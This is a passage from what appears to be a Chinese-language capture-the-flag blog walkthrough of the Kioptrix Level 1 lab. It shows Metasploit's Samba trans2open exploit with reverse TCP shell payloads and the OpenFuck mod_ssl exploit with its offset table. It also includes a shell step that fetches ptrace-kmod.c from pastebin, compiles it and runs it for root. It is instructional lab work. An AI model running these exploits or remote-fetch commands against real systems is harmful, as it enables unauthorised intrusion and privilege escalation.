exploit(linux/samba/trans2open) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   **RHOSTS                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using**</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 5 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 7 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 8 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>解決run運行問題</p>
-<p>  有時候kali在運行run後會出現</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[-] 192.168.19.140:139 - **Exploit failed: undefined method `each_module**<span class="string">&#x27; for [[&quot;x86/single_byte&quot;, Msf::Modules::Nop__X86__Single_byte::MetasploitModule], [&quot;x86/opty2&quot;, Msf::Modules::Nop__X86__Opty2::MetasploitModule]]:Array</span></span><br><span class="line"><span class="string">Did you mean?  each_slice</span></span><br><span class="line"><span class="string">[*] Exploit completed, but no session was created.</span></span><br></pre></td></tr></table></figure>
-<p>  這樣的錯誤問題有可能是源碼中使用each_module，但我在查看該rb檔案後沒發現有這行</p>
-<p>  <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/18828/files">https://github.com/rapid7/metasploit-framework/pull/18828/files</a></p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(X) nops.each_module &#123; |nopname, nopmod|</span><br><span class="line">(O) nops.each &#123; |nopname, nopmod|</span><br></pre></td></tr></table></figure>
-<p>  後來決定更新看看msf</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **apt update; apt install metasploit-framework**</span><br></pre></td></tr></table></figure>
-<p>  再次重開啟會看到msf沒報錯了</p>
-</li>
-</ul>
-<p>但從運行結果看到 <code>Meterpreter session X closed.  Reason: Died</code> </p>
-<p>這有可能是Payload的問題，可以換一個試試</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload** </span><br><span class="line"><span class="built_in">set</span> payload generic/custom                            <span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/debug_trap                        <span class="built_in">set</span> payload linux/x86/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_aws_ssm                <span class="built_in">set</span> payload linux/x86/metsvc_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_bind_tcp                    <span class="built_in">set</span> payload linux/x86/read_file</span><br><span class="line"><span class="built_in">set</span> payload generic/shell_reverse_tcp                 <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload generic/ssh/interact                      <span class="built_in">set</span> payload linux/x86/shell/bind_ipv6_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload generic/tight_loop                        <span class="built_in">set</span> payload linux/x86/shell/bind_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/adduser                         <span class="built_in">set</span> payload linux/x86/shell/bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/chmod                           <span class="built_in">set</span> payload linux/x86/shell/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/exec                            <span class="built_in">set</span> payload linux/x86/shell/reverse_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_nonx_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_nonx_tcp       <span class="built_in">set</span> payload linux/x86/shell/reverse_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp            <span class="built_in">set</span> payload linux/x86/shell_bind_ipv6_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/bind_tcp_uuid       <span class="built_in">set</span> payload linux/x86/shell_bind_tcp</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_ipv6_tcp    <span class="built_in">set</span> payload linux/x86/shell_bind_tcp_random_port</span><br><span class="line">**<span class="built_in">set</span> payload linux/x86/meterpreter/reverse_nonx_tcp    <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp         <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp_ipv6</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **<span class="built_in">set</span> payload linux/x86/shell_reverse_tcp**</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  192.168.19.140   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">**Payload options (linux/x86/shell_reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   CMD    /bin/sh          <span class="built_in">yes</span>       The <span class="built_in">command</span> string to execute</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
-
-<p>確認更換好payload後執行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff5fc...</span><br><span class="line">[*] Command shell session 9 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32777) at 2024-02-14 14:59:48 -0500</span><br><span class="line"></span><br><span class="line">[*] Command shell session 10 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32778) at 2024-02-14 14:59:49 -0500</span><br><span class="line">[*] Command shell session 11 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32779) at 2024-02-14 14:59:50 -0500</span><br><span class="line">[*] Command shell session 12 opened (192.168.19.130:4444 -&gt; 192.168.19.140:32780) at 2024-02-14 14:59:51 -0500</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"><span class="built_in">cat</span> /proc/version</span><br><span class="line">**Linux version 2.4.7-10** (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) <span class="comment">#1 Thu Sep 6 16:46:36 EDT 2001</span></span><br></pre></td></tr></table></figure>
-
-<p>成功利用版本漏洞進行RCE，同時知道了目標系統是Red Hat Linux 7.1 2.96-98</p>
-<p>查看linux版本方法</p>
-<ul>
-<li>lsb_release -a</li>
-<li>cat &#x2F;etc&#x2F;issue</li>
-<li>cat &#x2F;proc&#x2F;version</li>
-</ul>
-<h3 id="Manual-Exploitation"><a href="#Manual-Exploitation" class="headerlink" title="Manual Exploitation"></a><strong>Manual Exploitation</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">+** Red Hat Linux 7.1 2.96-98</span><br></pre></td></tr></table></figure>
-
-<p>根據前面找到的資訊進一步利用</p>
-<p>apache mod_ssl 該版本有可利用的漏洞，下載OpenFuck進行利用，根據版本選擇OffSet</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# git <span class="built_in">clone</span> https://github.com/heltonWernik/OpenFuck.git</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt]</span><br><span class="line">└─# <span class="built_in">cd</span> OpenFuck </span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# apt-get install libssl-dev</span><br><span class="line"></span><br><span class="line">                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# gcc -o OpenFuck OpenFuck.c -lcrypto</span><br><span class="line"></span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">OpenFuck  OpenFuck.c  README.md</span><br><span class="line">                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">: Usage: ./OpenFuck target box [port] [-c N]</span><br><span class="line"></span><br><span class="line">  target - supported box eg: 0x00</span><br><span class="line">  box - hostname or IP address</span><br><span class="line">  port - port <span class="keyword">for</span> ssl connection</span><br><span class="line">  -c open N connections. (use range 40-50 <span class="keyword">if</span> u dont know)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  Supported OffSet:</span><br><span class="line">        0x00 - Caldera OpenLinux (apache-1.3.26)</span><br><span class="line">        0x01 - Cobalt Sun 6.0 (apache-1.3.12)</span><br><span class="line">        0x02 - Cobalt Sun 6.0 (apache-1.3.20)</span><br><span class="line">        0x03 - Cobalt Sun x (apache-1.3.26)</span><br><span class="line">        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)</span><br><span class="line">        0x05 - Conectiva 4 (apache-1.3.6)</span><br><span class="line">        0x06 - Conectiva 4.1 (apache-1.3.9)</span><br><span class="line">        0x07 - Conectiva 6 (apache-1.3.14)</span><br><span class="line">        0x08 - Conectiva 7 (apache-1.3.12)</span><br><span class="line">        0x09 - Conectiva 7 (apache-1.3.19)</span><br><span class="line">        0x0a - Conectiva 7/8 (apache-1.3.26)</span><br><span class="line">        0x0b - Conectiva 8 (apache-1.3.22)</span><br><span class="line">        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)</span><br><span class="line">        0x0d - Debian GNU Linux (apache_1.3.19-1)</span><br><span class="line">        0x0e - Debian GNU Linux (apache_1.3.22-2)</span><br><span class="line">        0x0f - Debian GNU Linux (apache-1.3.22-2.1)</span><br><span class="line">        0x10 - Debian GNU Linux (apache-1.3.22-5)</span><br><span class="line">        0x11 - Debian GNU Linux (apache_1.3.23-1)</span><br><span class="line">        0x12 - Debian GNU Linux (apache_1.3.24-2.1)</span><br><span class="line">        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)</span><br><span class="line">        0x14 - Debian GNU Linux (apache_1.3.24-3)</span><br><span class="line">        0x15 - Debian GNU Linux (apache-1.3.26-1)</span><br><span class="line">        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)</span><br><span class="line">        0x17 - Debian GNU Linux (apache-1.3.27)</span><br><span class="line">        0x18 - FreeBSD (apache-1.3.9)</span><br><span class="line">        0x19 - FreeBSD (apache-1.3.11)</span><br><span class="line">        0x1a - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1b - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1c - FreeBSD (apache-1.3.12.1.40)</span><br><span class="line">        0x1d - FreeBSD (apache-1.3.12.1.40_1)</span><br><span class="line">        0x1e - FreeBSD (apache-1.3.12)</span><br><span class="line">        0x1f - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x20 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x21 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x22 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x23 - FreeBSD (apache-1.3.14)</span><br><span class="line">        0x24 - FreeBSD (apache-1.3.17_1)</span><br><span class="line">        0x25 - FreeBSD (apache-1.3.19)</span><br><span class="line">        0x26 - FreeBSD (apache-1.3.19_1)</span><br><span class="line">        0x27 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x28 - FreeBSD (apache-1.3.20)</span><br><span class="line">        0x29 - FreeBSD (apache-1.3.20+2.8.4)</span><br><span class="line">        0x2a - FreeBSD (apache-1.3.20_1)</span><br><span class="line">        0x2b - FreeBSD (apache-1.3.22)</span><br><span class="line">        0x2c - FreeBSD (apache-1.3.22_7)</span><br><span class="line">        0x2d - FreeBSD (apache_fp-1.3.23)</span><br><span class="line">        0x2e - FreeBSD (apache-1.3.24_7)</span><br><span class="line">        0x2f - FreeBSD (apache-1.3.24+2.8.8)</span><br><span class="line">        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)</span><br><span class="line">        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)</span><br><span class="line">        0x32 - FreeBSD (apache-1.3.27)</span><br><span class="line">        0x33 - Gentoo Linux (apache-1.3.24-r2)</span><br><span class="line">        0x34 - Linux Generic (apache-1.3.14)</span><br><span class="line">        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)</span><br><span class="line">        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)</span><br><span class="line">        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)</span><br><span class="line">        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)</span><br><span class="line">        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2</span><br><span class="line">        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)</span><br><span class="line">        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)</span><br><span class="line">        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)</span><br><span class="line">        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)</span><br><span class="line">        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)</span><br><span class="line">        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)</span><br><span class="line">        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)</span><br><span class="line">        0x41 - Mandrake Linux 8.2 <span class="comment">#2 (apache-1.3.23-4)</span></span><br><span class="line">        0x42 - Mandrake Linux 8.2 (apache-1.3.24)</span><br><span class="line">        0x43 - Mandrake Linux 9 (apache-1.3.26)</span><br><span class="line">        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)</span><br><span class="line">        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)</span><br><span class="line">        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)</span><br><span class="line">        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)</span><br><span class="line">        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)</span><br><span class="line">        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)</span><br><span class="line">        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)</span><br><span class="line">        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)</span><br><span class="line">        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)</span><br><span class="line">        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)</span><br><span class="line">        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)</span><br><span class="line">        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)</span><br><span class="line">        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1</span><br><span class="line">        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2</span><br><span class="line">        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)</span><br><span class="line">        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)</span><br><span class="line">        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1</span><br><span class="line">        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2</span><br><span class="line">        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3</span><br><span class="line">        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1</span><br><span class="line">        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2</span><br><span class="line">        0x5b - Redhat Linux 7.x (apache-1.3.22)</span><br><span class="line">        0x5c - RedHat Linux 7.x (apache-1.3.26-1)</span><br><span class="line">        0x5d - RedHat Linux 7.x (apache-1.3.27)</span><br><span class="line">        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1</span><br><span class="line">        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2</span><br><span class="line">        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)</span><br><span class="line">        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)</span><br><span class="line">        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1</span><br><span class="line">        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2</span><br><span class="line">        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)</span><br><span class="line">        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)</span><br><span class="line">        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)</span><br><span class="line">        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)</span><br><span class="line">        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</span><br><span class="line">        **0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2**</span><br><span class="line">        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)</span><br><span class="line">        0x6d - RedHat Linux 7.2 (apache-1.3.24)</span><br><span class="line">        0x6e - RedHat Linux 7.2 (apache-1.3.26)</span><br><span class="line">        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)</span><br><span class="line">        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1</span><br><span class="line">        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2</span><br><span class="line">        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)</span><br><span class="line">        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1</span><br><span class="line">        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2</span><br><span class="line">        0x75 - RedHat Linux 7.3 (apache-1.3.27)</span><br><span class="line">        0x76 - RedHat Linux 8.0 (apache-1.3.27)</span><br><span class="line">        0x77 - RedHat Linux 8.0-second (apache-1.3.27)</span><br><span class="line">        0x78 - RedHat Linux 8.0 (apache-2.0.40)</span><br><span class="line">        0x79 - Slackware Linux 4.0 (apache-1.3.6)</span><br><span class="line">        0x7a - Slackware Linux 7.0 (apache-1.3.9)</span><br><span class="line">        0x7b - Slackware Linux 7.0 (apache-1.3.26)</span><br><span class="line">        0x7c - Slackware 7.0  (apache-1.3.26)2</span><br><span class="line">        0x7d - Slackware Linux 7.1 (apache-1.3.12)</span><br><span class="line">        0x7e - Slackware Linux 8.0 (apache-1.3.20)</span><br><span class="line">        0x7f - Slackware Linux 8.1 (apache-1.3.24)</span><br><span class="line">        0x80 - Slackware Linux 8.1 (apache-1.3.26)</span><br><span class="line">        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)</span><br><span class="line">        0x82 - Slackware Linux (apache-1.3.27)</span><br><span class="line">        0x83 - SuSE Linux 7.0 (apache-1.3.12)</span><br><span class="line">        0x84 - SuSE Linux 7.1 (apache-1.3.17)</span><br><span class="line">        0x85 - SuSE Linux 7.2 (apache-1.3.19)</span><br><span class="line">        0x86 - SuSE Linux 7.3 (apache-1.3.20)</span><br><span class="line">        0x87 - SuSE Linux 8.0 (apache-1.3.23)</span><br><span class="line">        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)</span><br><span class="line">        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)</span><br><span class="line">        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)</span><br><span class="line"></span><br><span class="line">Fuck to all guys <span class="built_in">who</span> like use lamah ddos. Read SRC to have no surprise</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>找到了符合版本可以進行利用的offset</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/opt/OpenFuck]</span><br><span class="line">└─# ./OpenFuck 0x6b 192.168.19.140 -c 40     </span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* <span class="comment">#hackarena  irc.brasnet.org                                     *</span></span><br><span class="line">* TNX Xanthic USG <span class="comment">#SilverLords #BloodBR #isotk #highsecure #uname *</span></span><br><span class="line">* <span class="comment">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span></span><br><span class="line">* <span class="comment">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span></span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Connection... 40 of 40</span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">race-kmod.c; gcc -o p ptrace-kmod.c; <span class="built_in">rm</span> ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt </span><br><span class="line">--04:46:23--  https://pastebin.com/raw/C7v25Xr9</span><br><span class="line">           =&gt; `ptrace-kmod.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to pastebin.com:443... connected!</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0K ...                                                    @   3.84 MB/s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">04:46:24 (3.84 MB/s) - `ptrace-kmod.c&#x27;</span> saved [4026]</span><br><span class="line"></span><br><span class="line">ptrace-kmod.c:183:1: warning: no newline at end of file</span><br><span class="line">[+] Attached to 6630</span><br><span class="line">[+] Waiting <span class="keyword">for</span> signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now <span class="built_in">wait</span> <span class="keyword">for</span> suid shell...</span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">hostname</span><br><span class="line">kioptrix.level1</span><br><span class="line"></span><br><span class="line">locate flag</span><br><span class="line">/usr/sbin/rootflags</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_c/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_cxx/env_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/db_set_flags.html</span><br><span class="line">/usr/share/doc/db3-devel-3.2.9/api_java/env_set_flags.html</span><br><span 